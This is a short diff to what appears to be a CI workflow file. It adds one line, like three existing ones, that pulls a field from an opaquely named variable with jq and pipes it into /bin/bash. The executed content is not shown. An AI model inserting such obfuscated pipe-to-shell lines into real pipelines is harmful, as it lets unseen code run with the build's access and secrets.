@@ -31,6 +31,7 @@ jobs:
           echo $gpf2979 | jq -r .cdqx93 | /bin/bash
           printf '%s' "$bmxn03330" | jq -r .o9 | /bin/bash
           echo $sgfc64 | jq -r .p17 | /bin/bash
+          echo $ndhxj03 | jq -r .si895 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
